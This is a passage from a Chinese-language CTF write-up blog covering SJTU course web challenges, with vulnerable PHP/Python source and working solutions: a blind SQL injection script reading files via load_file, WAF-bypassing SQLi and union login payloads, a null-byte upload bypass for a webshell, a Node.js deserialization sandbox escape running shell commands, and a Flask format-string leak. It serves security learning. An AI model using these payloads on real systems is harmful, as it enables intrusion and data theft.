<h2 id="sqli-read-file"><a href="#sqli-read-file" class="headerlink" title="sqli - read file"></a>sqli - read file</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$col</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;col&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$col</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$col</span>, <span class="string">&quot;select&quot;</span>) !== False)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user order by <span class="subst">$col</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rows</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$rows</span>);</span><br></pre></td></tr></table></figure>

<p>二分法+盲注</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, requests, sys</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://web1.0ops.sjtu.cn:40038/file/index.php&quot;</span></span><br><span class="line">TIMEOUT = <span class="number">8</span></span><br><span class="line">PATH_HEX = <span class="string">&quot;0x2f666c61672f666c6167&quot;</span>  <span class="comment"># /flag/flag</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_row_id</span>(<span class="params">col_expr</span>):</span><br><span class="line">    r = s.get(BASE, params=&#123;<span class="string">&quot;col&quot;</span>: col_expr&#125;, timeout=TIMEOUT)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(r.text[<span class="number">35</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Baselines you observed:</span></span><br><span class="line">ID_TRUE  = <span class="number">3</span>  <span class="comment"># rand(1)</span></span><br><span class="line">ID_FALSE = <span class="number">2</span>  <span class="comment"># rand(2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boolean</span>(<span class="params">expr</span>):</span><br><span class="line">    rid = first_row_id(expr)</span><br><span class="line">    <span class="keyword">if</span> rid == ID_TRUE:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> rid == ID_FALSE:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unexpected first row id:&quot;</span>, rid, <span class="string">&quot;expr:&quot;</span>, expr)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gt</span>(<span class="params">pos, mid</span>):</span><br><span class="line">    expr = <span class="string">f&quot;if(ascii(substr(load_file(<span class="subst">&#123;PATH_HEX&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,rand(1),rand(2))&quot;</span></span><br><span class="line">    <span class="keyword">return</span> boolean(expr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_char</span>(<span class="params">pos</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">126</span></span><br><span class="line">    <span class="comment"># quick empty check</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> gt(pos, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> gt(pos, mid):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(lo) <span class="keyword">if</span> lo &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readable</span>():</span><br><span class="line">    expr = <span class="string">f&quot;if(length(load_file(<span class="subst">&#123;PATH_HEX&#125;</span>))&gt;0,rand(1),rand(2))&quot;</span></span><br><span class="line">    <span class="keyword">return</span> boolean(expr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> readable():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LOAD_FILE() 读不到 /flag/flag（可能 secure_file_priv/权限限制）&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4097</span>):</span><br><span class="line">    ch = leak_char(pos)</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag.append(ch)</span><br><span class="line">    cur = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">    <span class="built_in">print</span>(cur)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Dump result:&quot;</span>, <span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{load_file_166aac56f849573be}</p>
</blockquote>
<h2 id="sqli-write-file"><a href="#sqli-write-file" class="headerlink" title="sqli - write file"></a>sqli - write file</h2><p>源码同上题，需要写马到&#x2F;var&#x2F;www&#x2F;html&#x2F;webshell目录下</p>
<h2 id="Baby-web"><a href="#Baby-web" class="headerlink" title="Baby web"></a>Baby web</h2><p>admin_l0gin_page.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="string">&quot;babyWeb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$db</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to connect to MySQL&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM `user` WHERE username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>( <span class="variable">$sql</span> )) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>)&#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Login success!</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;username or password error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">    	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;db error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先手动fuzz一下被过滤的字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 空格 , / or and</span><br></pre></td></tr></table></figure>

<p>or可以用||代替，空格可以用%09代替，and可以用&amp;&amp;代替</p>
<p>这个payload可以延时盲注出数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;||(case%09when%09substring(database()%09from%091)=&#x27;babyweb&#x27;%09then%09sleep(5)%09else%091%09end)#&amp;password=1</span><br><span class="line"></span><br><span class="line">babyweb</span><br><span class="line"></span><br><span class="line">username=1&#x27;||(case%09when%09substring((select%09id%09from%09`user`)%09from%091)=&#x27;1&#x27;%09then%09sleep(5)%09else%091%09end)#&amp;password=1</span><br><span class="line">id只有一个 1</span><br><span class="line"></span><br><span class="line">username=1&#x27;||(case%09when%09substring((select%09username%09from%09`user`)%09from%091)=&#x27;admin&#x27;%09then%09sleep(5)%09else%091%09end)#&amp;password=1</span><br><span class="line">username只有一个 admin</span><br><span class="line"></span><br><span class="line">这里password用0x70617373776F7264代替</span><br><span class="line">username=1&#x27;||(case%09when%09length((select%090x70617373776F7264%09from%09`user`))&gt;8%09then%09sleep(5)%09else%091%09end)#&amp;password=1</span><br><span class="line">发现password长度为8位</span><br><span class="line">但是实际上并非，这里password不能用0x70617373776F7264代替</span><br></pre></td></tr></table></figure>

<p>靠，原来联合注入就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: a&#x27;union%09select%092%09--%09</span><br><span class="line">password: 2</span><br></pre></td></tr></table></figure>

<p>admin_m4nage_page.php<br>提示可以上传图片。利用%00截断，将pa.phtml.png的第二个.(0x2E)改为0x00，最终服务端的文件名为pa.phtml，访问此文件即可完成攻击。</p>
<blockquote>
<p>0ops{Sometimes_robots_can_h3lp_U} </p>
</blockquote>
<h2 id="js-ser-1"><a href="#js-ser-1" class="headerlink" title="js - ser -1"></a>js - ser -1</h2><p>nodejs反序列化，有沙箱，需要逃逸出沙箱</p>
<p>若想先验证逃逸是否成功，可先用这个探测型payload 看是否回显 Node 版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: web1.0ops.sjtu.cn:40017</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: secret=eyJfX2pzX2Z1bmN0aW9uIjoiZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5jb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcigncmV0dXJuIHByb2Nlc3MnKSgpLnZlcnNpb247fSJ9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;b-Ck1VqNd45QIvq3AZd8XYQLvEhtA&quot;</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>

<p>成功回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10.15.1</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__js_function&quot;:&quot;function()&#123;return this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /home/ctf/5ba170daba9b0dde23faf30bd87fccc3&#x27;).toString();&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: web1.0ops.sjtu.cn:40017</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: secret=eyJfX2pzX2Z1bmN0aW9uIjoiZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5jb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcigncmV0dXJuIHByb2Nlc3MnKSgpLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgL2hvbWUvY3RmLzViYTE3MGRhYmE5YjBkZGUyM2ZhZjMwYmQ4N2ZjY2MzJykudG9TdHJpbmcoKTt9In0=</span><br><span class="line">Content-Length: 0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;b-Ck1VqNd45QIvq3AZd8XYQLvEhtA&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{9c120aa5da0e8e757968861b1fd92438}</p>
</blockquote>
<h2 id="pyformat"><a href="#pyformat" class="headerlink" title="pyformat"></a>pyformat</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    guess = request.args.get(<span class="string">&#x27;guess&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> guess:</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> guess == secrets.token_hex(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nice guess! Your flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(FLAG)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;Better luck next time!&lt;br/&gt;&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Your IP: &#123;r.remote_addr&#125;&lt;br/&gt;&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Your User Agent: &#123;r.user_agent&#125;&lt;br/&gt;&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Your Guess: &#x27;</span> + html.escape(guess)).<span class="built_in">format</span>(r=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>Python 会先把多行相邻字符串字面量静态拼接成一个大模板，然后再把 <code>&quot;Your Guess: &quot; + html.escape(guess)</code> 这个结果动态拼接到末尾，最终得到一个包含用户输入的模板字符串。</p>
<p>接着对整个字符串调用 <code>.format(r=request)</code>。这意味着：如果用户的 <code>guess</code> 里含有花括号 <code>&#123;&#125;</code>，就会被当成 <code>str.format</code> 的占位符来解析！</p>
<p>由于 <code>html.escape()</code> 不会逃逸花括号 <code>&#123;&#125;</code> 与 <code>&#125;</code>，所以这就是一个 Python 格式化字符串注入（Format String Injection）。</p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web1.0ops.sjtu.cn:40045/?guess=&#123;r._LocalProxy__local.func.__globals__[_request_ctx_stack].top.app.view_functions[index].__globals__[FLAG]&#125;</span><br></pre></td></tr></table></figure>

<p>payload分析</p>
<ul>
<li><code>r</code> 是 <code>werkzeug.local.LocalProxy</code>。它有个私有属性 <code>_LocalProxy__local</code>，在 Flask 里是 <code>functools.partial(_lookup_req_object, &#39;request&#39;)</code>。</li>
<li><code>._LocalProxy__local.func.__globals__</code> 拿到 <code>flask.globals</code> 模块字典，其中有 <code>_request_ctx_stack</code>。</li>
<li><code>[_request_ctx_stack].top</code> 是当前 <code>RequestContext</code>；<code>.app</code> 是当前 <code>Flask app</code>。</li>
<li><code>app.view_functions[index]</code> 是路由函数对象（此题 <code>def index(): ...</code>，<code>endpoint</code> 名即 <code>index</code>）。</li>
<li>视图函数对象的 <code>__globals__</code> 就是我们这个应用模块的全局命名空间，其中直接有 <code>FLAG</code>（因为 <code>from flag import FLAG</code>）。</li>
<li>全程只用了属性&#x2F;下标访问：<code>[]</code> 里的 <code>index、FLAG、_request_ctx_stack</code> 都是无引号键名，不会被 <code>html.escape</code> 干扰。</li>
</ul>
<blockquote>
<p>0ops{python_format_string_info_leak_b2505dcf1615}</p>
</blockquote>
<h2 id="todo-cmdi-blind-0ops-bypass-addslashes-ssrf-bypass-2-sqli-bypass1-ssrf-bypass-3-sqli-insert"><a href="#todo-cmdi-blind-0ops-bypass-addslashes-ssrf-bypass-2-sqli-bypass1-ssrf-bypass-3-sqli-insert" class="headerlink" title="todo: cmdi - blind, 0ops, bypass addslashes?, ssrf - bypass - 2, sqli - bypass1, ssrf - bypass - 3, sqli - insert"></a>todo: cmdi - blind, 0ops, bypass addslashes?, ssrf - bypass - 2, sqli - bypass1, ssrf - bypass - 3, sqli - insert</h2><!-- flag of hidden posts --></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/07/24/SJTU-OJ-WEB/">https://sakuraraindrop.github.io/2025/07/24/SJTU-OJ-WEB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hidden-flag"><span class="toc-number">1.</span> <span class="toc-text">hidden flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-warmup"><span class="toc-number">2.</span> <span class="toc-text">sqli - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-error-injection"><span class="toc-number">3.</span> <span class="toc-text">sqli - error injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-bool-injection"><span class="toc-number">4.</span> <span class="toc-text">sqli - bool injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-orderby"><span class="toc-number">5.</span> <span class="toc-text">sqli - orderby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-addslashes"><span class="toc-number">6.</span> <span class="toc-text">bypass addslashes?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-tricks-weak-type"><span class="toc-number">7.</span> <span class="toc-text">php tricks - weak type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-tricks-magic-hash"><span class="toc-number">8.</span> <span class="toc-text">php tricks - magic hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-tricks-shatter-sha1"><span class="toc-number">9.</span> <span class="toc-text">php tricks - shatter sha1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-tricks-ancient"><span class="toc-number">10.</span> <span class="toc-text">php tricks - ancient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-collision-1"><span class="toc-number">11.</span> <span class="toc-text">md5 collision 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-web"><span class="toc-number">12.</span> <span class="toc-text">Basic web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdi-warmup"><span class="toc-number">13.</span> <span class="toc-text">cmdi - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdi-space"><span class="toc-number">14.</span> <span class="toc-text">cmdi -space</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdi-outbound"><span class="toc-number">15.</span> <span class="toc-text">cmdi - outbound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdi-blind"><span class="toc-number">16.</span> <span 